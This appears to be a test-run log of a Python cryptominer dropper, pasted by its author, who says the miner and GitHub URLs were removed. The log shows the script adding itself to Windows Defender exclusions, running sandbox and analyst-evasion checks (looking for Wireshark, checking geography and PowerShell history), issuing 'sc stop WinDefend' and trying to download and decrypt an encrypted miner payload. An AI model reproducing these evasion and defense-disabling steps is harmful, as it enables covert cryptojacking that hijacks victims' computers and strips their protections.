@@ -1,0 +1,80 @@
+removed the miner url and the other GitHub url because i dont wannan tell u it but those 2 lines where there tho 
+
+
+Check the URLs above. Press Enter to continue...
+2026-07-09 09:39:01,379|INFO|[MAIN] start, PID=6056, sleeping 60 seconds to avoid startup noise
+2026-07-09 09:40:01,385|INFO|[MAIN] woke up, args=['C:\\Users\\mark\\OneDrive\\Desktop\\off.py']
+2026-07-09 09:40:01,400|INFO|[EXCLUSION] adding script to Defender exclusions
+2026-07-09 09:40:03,585|INFO|[EXCLUSION] done
+2026-07-09 09:40:03,586|INFO|[RAM_CHECK] start
+2026-07-09 09:40:03,588|DEBUG|[RAM_CHECK] total=7.72 GB
+2026-07-09 09:40:03,588|INFO|[RAM_CHECK] pass
+2026-07-09 09:40:03,588|INFO|[USER_CHECK] start
+2026-07-09 09:40:03,589|DEBUG|[USER_CHECK] username=mark
+2026-07-09 09:40:03,589|INFO|[USER_CHECK] pass
+2026-07-09 09:40:03,589|INFO|[PROC_CHECK] start
+2026-07-09 09:40:04,018|INFO|[PROC_CHECK] pass
+2026-07-09 09:40:04,018|INFO|[SW_CHECK] start
+2026-07-09 09:40:04,019|CRITICAL|[SW_CHECK] Tool: wireshark 4.6.4 x64
+2026-07-09 09:40:04,020|WARNING|TESTING: Would have exited – Tool: wireshark 4.6.4 x64
+2026-07-09 09:40:04,020|CRITICAL|[SW_CHECK] Tool: resource hacker version 5.2.8
+2026-07-09 09:40:04,020|WARNING|TESTING: Would have exited – Tool: resource hacker version 5.2.8
+2026-07-09 09:40:04,021|DEBUG|[SW_CHECK] total keys enumerated: 103
+2026-07-09 09:40:04,021|INFO|[SW_CHECK] pass
+2026-07-09 09:40:04,021|INFO|[GEO_CHECK] start
+2026-07-09 09:40:04,021|DEBUG|[GEO_CHECK] GeoID=39
+2026-07-09 09:40:04,021|INFO|[GEO_CHECK] pass via GeoID
+2026-07-09 09:40:04,022|INFO|[TZ_CHECK] start
+2026-07-09 09:40:04,022|DEBUG|[TZ_CHECK] timezone: Eastern Standard Time
+2026-07-09 09:40:04,022|INFO|[TZ_CHECK] pass
+2026-07-09 09:40:04,022|INFO|[PS_CHECK] start
+2026-07-09 09:40:04,024|DEBUG|[PS_CHECK] line count=2058
+2026-07-09 09:40:08,096|CRITICAL|[PS_CHECK] count 2058 > 2000
+2026-07-09 09:40:08,096|WARNING|TESTING: Would have exited – PS history large (2058)
+2026-07-09 09:40:08,099|DEBUG|[PS_CHECK] risky high=0, low=1
+2026-07-09 09:40:08,099|INFO|[PS_CHECK] pass
+2026-07-09 09:40:08,100|INFO|[HISTORY_CHECK] start
+2026-07-09 09:40:08,164|DEBUG|[HISTORY_CHECK] total=12115
+2026-07-09 09:40:08,164|INFO|[HISTORY_CHECK] end
+2026-07-09 09:40:08,164|INFO|[MAIN] all checks passed – environment legitimate
+2026-07-09 09:40:08,165|INFO|[DEFENDER_DISABLE] start
+2026-07-09 09:40:18,679|ERROR|[DEFENDER_DISABLE] failed: [WinError 5] Access is denied
+Traceback (most recent call last):
+  File "C:\Users\jayce\OneDrive\Desktop\off.py", line 484, in disable_defender_cloud
+    subprocess.run('sc stop WinDefend', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+    ~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\mark\AppData\Local\Programs\Python\Python314\Lib\subprocess.py", line 555, in run
+    with Popen(*popenargs, **kwargs) as process:
+         ~~~~~^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\mark\AppData\Local\Programs\Python\Python314\Lib\subprocess.py", line 1039, in __init__
+    self._execute_child(args, executable, preexec_fn, close_fds,
+    ~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+                        pass_fds, cwd, env,
+                        ^^^^^^^^^^^^^^^^^^^
+    ...<5 lines>...
+                        gid, gids, uid, umask,
+                        ^^^^^^^^^^^^^^^^^^^^^^
+                        start_new_session, process_group)
+                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "C:\Users\mark\AppData\Local\Programs\Python\Python314\Lib\subprocess.py", line 1553, in _execute_child
+    hp, ht, pid, tid = _winapi.CreateProcess(executable, args,
+                       ~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^
+                             # no special security
+                             ^^^^^^^^^^^^^^^^^^^^^
+    ...<4 lines>...
+                             cwd,
+                             ^^^^
+                             startupinfo)
+                             ^^^^^^^^^^^^
+PermissionError: [WinError 5] Access is denied
+2026-07-09 09:40:18,699|INFO|[WIN_UPDATE_DISABLE] start
+2026-07-09 09:40:18,699|INFO|[WIN_UPDATE_DISABLE] already disabled via policy
+2026-07-09 09:40:18,847|INFO|[DOWNLOAD] start
+2026-07-09 09:40:18,847|DEBUG|[DOWNLOAD] fetching encrypted miner zip from i dont wnana expose that either so i removed that part     
+2026-07-09 09:40:19,406|ERROR|AES decrypt failed:
+2026-07-09 09:40:19,407|ERROR|[DOWNLOAD] Decryption of miner zip failed
+2026-07-09 09:40:19,407|CRITICAL|[PAYLOAD] preparation failed, aborting
+2026-07-09 09:40:19,408|INFO|[ENV] Admin: True
+2026-07-09 09:40:19,408|INFO|[ENV] Country (GeoID): Canada
+2026-07-09 09:40:19,408|CRITICAL|TRIGGER_EXIT|code=999|reason=Payload preparation failed
+2026-07-09 09:40:19,408|INFO|Press Enter to exit...
